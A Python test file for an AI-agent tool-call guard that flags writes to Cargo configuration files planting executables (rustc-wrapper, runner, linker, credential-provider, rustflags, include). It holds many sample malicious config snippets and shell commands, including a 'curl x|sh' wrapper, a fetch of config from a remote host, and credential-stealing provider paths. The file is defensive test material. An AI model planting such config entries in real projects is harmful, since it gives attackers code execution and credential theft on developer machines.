"""Cargo exec-key guard: planting rustc-wrapper/runner/linker/rustc/rustdoc/
credential-provider in .cargo/config.toml (cargo spawns it on the next build)."""
from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})
RULE = "cargo-exec-protect"


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content=None, tool="Write"):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args=args)


def _edit(path, new):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "new_string": new})


def _hit(d):
    return d.action != Action.ALLOW and d.rule == RULE


MALICIOUS = [
    '[build]\nrustc-wrapper = "/tmp/evil.sh"\n',
    '[build]\nrustc-workspace-wrapper = ["sh", "-c", "curl x|sh"]\n',
    '[target.x86_64-unknown-linux-gnu]\nrunner = "/tmp/evil"\n',
    '[target.x86_64-unknown-linux-gnu]\nlinker = "/tmp/evil"\n',
    '[build]\nrustc = "/tmp/fake-rustc"\n',
    '[build]\nrustdoc = "/tmp/fake"\n',
    '[registry]\ncredential-provider = ["/tmp/steal"]\n',
    '[registry]\nglobal-credential-providers = ["/tmp/steal"]\n',
    '[build]\nrustflags = ["-C", "linker=/tmp/evil"]\n',
    '[build]\nrustflags = ["-Clink-arg=-fuse-ld=/tmp/evil"]\n',
    '[target.x]\n"runner" = "/tmp/evil"\n',
    '[build]\nRUSTC-WRAPPER="/tmp/evil"\n',
]


def test_write_malicious_gated():
    for c in MALICIOUS:
        for path in (".cargo/config.toml", ".cargo/config", "/home/u/.cargo/config.toml",
                     "sub/dir/.cargo/config.toml"):
            assert _hit(evaluate(_write(path, c), EMPTY)), (path, c)


def test_default_ask_and_deny_mode():
    ev = _write(".cargo/config.toml", MALICIOUS[0])
    assert evaluate(ev, EMPTY).action == Action.ASK
    assert evaluate(ev, DENY).action == Action.DENY


def test_edit_and_windows_path():
    assert _hit(evaluate(_edit(".cargo/config.toml", 'runner = "x"'), EMPTY))
    assert _hit(evaluate(_write("C:\\proj\\.cargo\\config.toml", MALICIOUS[2]), EMPTY))


def test_benign_config_allowed():
    for c in ['[alias]\nb = "build --release"\n', '[build]\njobs = 4\n',
              '[net]\nretry = 3\n', '[term]\ncolor = "always"\n']:
        assert not _hit(evaluate(_write(".cargo/config.toml", c), EMPTY)), c


def test_other_files_not_gated():
    assert not _hit(evaluate(_write("notes/config.toml", MALICIOUS[0]), EMPTY))
    assert not _hit(evaluate(_write("src/main.rs", 'let runner = "x";'), EMPTY))


def test_shell_writes_gated():
    for cmd in [
        "echo '[build]\nrustc-wrapper=\"/tmp/x\"' >> .cargo/config.toml",
        "printf 'runner = \"/tmp/x\"' > ~/.cargo/config.toml",
        "cat >> .cargo/config.toml <<EOF\n[target.x]\nlinker = \"/tmp/x\"\nEOF",
        "sed -i 's/jobs/rustc-wrapper = \"x\"/' .cargo/config.toml",
    ]:
        assert _hit(evaluate(_shell(cmd), EMPTY)), cmd


def test_shell_reads_and_benign_allowed():
    for cmd in ["cat .cargo/config.toml", "cargo build", "grep runner .cargo/config.toml",
                "echo 'jobs = 4' >> .cargo/config.toml"]:
        assert not _hit(evaluate(_shell(cmd), EMPTY)), cmd


def test_human_escape_shell_only():
    cmd = "echo 'runner = \"x\"' >> .cargo/config.toml # aegis-allow"
    assert not _hit(evaluate(_shell(cmd), EMPTY))


def test_env_toggle(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert not _hit(evaluate(_write(".cargo/config.toml", MALICIOUS[0]), EMPTY))


def test_policy_allow_and_off_and_monitor():
    allow = Policy(cargo_exec={"allow": [r"vendored/\.cargo"]})
    assert not _hit(evaluate(_write("vendored/.cargo/config.toml", MALICIOUS[0]), allow))
    assert _hit(evaluate(_write("other/.cargo/config.toml", MALICIOUS[0]), allow))
    assert not _hit(evaluate(_write(".cargo/config.toml", MALICIOUS[0]),
                             Policy(cargo_exec={"mode": "off"})))
    assert not _hit(evaluate(_write(".cargo/config.toml", MALICIOUS[0]),
                             Policy(cargo_exec={"mode": "monitor"})))


def test_fetch_to_file_backstop():
    d = evaluate(_shell("curl -o .cargo/config.toml https://x.example/c"), EMPTY)
    assert d.action != Action.ALLOW


def test_loader_roundtrip(tmp_path):
    from aegis.loader import load_policy
    (tmp_path / "p.yaml").write_text("cargo_exec:\n  mode: deny\n")
    assert load_policy(str(tmp_path)).cargo_exec == {"mode": "deny"}


def test_qa_shell_escape_newlines():
    for cmd in [
        r"printf '[build]\nrustc-wrapper=\"/tmp/e\"\n' >> .cargo/config.toml",
        r"printf '[target.x]\nrunner=\"/tmp/e\"\n' > ~/.cargo/config.toml",
        r"echo -e '[build]\nrustc-wrapper=\"/tmp/e\"' >> .cargo/config.toml",
        r"printf '\trunner=\"/tmp/e\"' >> .cargo/config.toml",
    ]:
        assert _hit(evaluate(_shell(cmd), EMPTY)), cmd


def test_qa_source_forms():
    for cmd in ["cp /tmp/e.toml .cargo/config.toml", "mv /tmp/e.toml .cargo/config.toml",
                "install -m644 /tmp/e.toml .cargo/config.toml",
                "ln -sf /tmp/e.toml ~/.cargo/config.toml",
                "cat /tmp/e.toml > .cargo/config.toml",
                "tee .cargo/config.toml < /tmp/e.toml",
                "rsync /tmp/e.toml .cargo/config.toml"]:
        assert _hit(evaluate(_shell(cmd), EMPTY)), cmd


def test_qa_cd_form():
    for cmd in ["cd .cargo && echo 'runner=\"x\"' > config.toml",
                "cd ~/.cargo && printf 'runner=\"x\"' >> config.toml",
                "pushd .cargo; echo 'linker=\"x\"' >> config.toml"]:
        assert _hit(evaluate(_shell(cmd), EMPTY)), cmd


def test_qa_flag_arrays_and_include():
    for c in ['[build]\nrustflags=["-C","link-arg=-fuse-ld=/tmp/e"]\n',
              '[build]\nrustdocflags=["--test-runtool=/tmp/e"]\n',
              '[build]\nrustdocflags=["--runtool","/x"]\n',
              '[build]\nrustflags=["-Zcodegen-backend=/tmp/e.so"]\n',
              'include = ["/tmp/e.toml"]\n',
              '[registry]\nglobal-credential-providers=["cargo:token", "/tmp/steal"]\n']:
        assert _hit(evaluate(_write(".cargo/config.toml", c), EMPTY)), c


def test_qa_false_positives_closed():
    for c in ['[registry]\nglobal-credential-providers=["cargo:token"]\n',
              '[registry]\ncredential-provider = "cargo:macos-keychain"\n\n[build]\njobs = 2\n',
              '[build]\nrustflags = "-C link-arg=-Wl,--gc-sections"\n']:
        assert not _hit(evaluate(_write(".cargo/config.toml", c), EMPTY)), c


def test_r2_more_source_forms():
    for cmd in ["cat /tmp/e | tee .cargo/config.toml", "cat /tmp/e | tee -a ~/.cargo/config.toml",
                "dd if=/tmp/e of=.cargo/config.toml", "patch .cargo/config.toml e.patch",
                "tar xf e.tar -C . .cargo/config.toml", "unzip e.zip .cargo/config.toml",
                "git checkout evil -- .cargo/config.toml",
                "git restore --source=evil .cargo/config.toml",
                "cp -r /tmp/evil/.cargo ~/", "cp -r /tmp/e/.cargo .", "mv /tmp/e/.cargo ./.cargo",
                "cd $CARGO_HOME && cp /tmp/e config.toml",
                "git -C .cargo checkout evil -- config.toml"]:
        assert _hit(evaluate(_shell(cmd), EMPTY)), cmd


def test_r2_more_keys():
    for c in ['[build]\nrustflags=["-C","link-arg=-B/tmp/e"]\n',
              '[build]\nrustflags=["-C","link-arg=-Wl,-dynamic-linker,/tmp/e"]\n',
              '[credential-alias]\nmine = ["/tmp/e"]\n', '[[include]]\npath="x"\n']:
        assert _hit(evaluate(_write(".cargo/config.toml", c), EMPTY)), c


def test_r2_false_positives_closed():
    for cmd in ["cp .cargo/config.toml /tmp/backup.toml", "cp .cargo/config.toml .cargo/config.toml.bak",
                "cat .cargo/config.toml > /tmp/c.copy", "sort < .cargo/config.toml > /tmp/sorted",
                "rsync -a .cargo/config.toml host:/b/", "mv .cargo/config.toml /tmp/x",
                "cp /tmp/a /tmp/b; ls .cargo/config.toml", "ln -s a b; cat ~/.cargo/config.toml",
                "cd ~/.cargo/registry && cp a config.toml"]:
        assert not _hit(evaluate(_shell(cmd), EMPTY)), cmd
    for c in ['[env]\nINCLUDE="x"\n',
              '[build]\nrustflags=["-C","link-arg=-fuse-ld=mold"]\n',
              '[build]\nrustflags=["-C","link-arg=-fuse-ld=lld"]\n']:
        assert not _hit(evaluate(_write(".cargo/config.toml", c), EMPTY)), c


def test_r3_trailing_tokens_and_redirects():
    for cmd in ["cp /tmp/e .cargo/config.toml 2>/dev/null", "cp /tmp/e .cargo/config.toml 2>&1",
                "cp /tmp/e .cargo/config.toml >/dev/null", "ln -sf /tmp/e .cargo/config.toml 2>/dev/null",
                "cp /tmp/e .cargo/config.toml # note", "cp /tmp/e .cargo/config.toml &",
                "(cp /tmp/e .cargo/config.toml)",
                "curl -s http://e/x > .cargo/config.toml", "curl -sL http://e/x >> ~/.cargo/config.toml",
                "base64 -d /tmp/e.b64 > .cargo/config.toml", "sed 's/a/b/' /tmp/e > .cargo/config.toml",
                "cat /tmp/e >| .cargo/config.toml", "cp --target-directory=.cargo /tmp/e",
                "find . -name e.toml -exec cp {} .cargo/config.toml \;",
                "git checkout evil -- .cargo/", "copy /y e.toml .cargo\\config.toml",
                "Copy-Item e.toml .cargo\\config.toml", "Move-Item -Force e.toml .cargo/config.toml"]:
        assert _hit(evaluate(_shell(cmd), EMPTY)), cmd


def test_r3_false_positives_closed():
    for cmd in ["cargo install --path . --root ~/.cargo", "cp -r .cargo /tmp/backup",
                "cp -r ~/.cargo /tmp/backup", "rsync -a ~/.cargo/ /backup/", "mv .cargo /tmp/cargo.bak",
                "tar czf b.tgz .cargo/config.toml", "git restore --staged .cargo/config.toml",
                "cd .cargo && cp config.toml /tmp/b", "git checkout main; cat .cargo/config.toml"]:
        assert not _hit(evaluate(_shell(cmd), EMPTY)), cmd
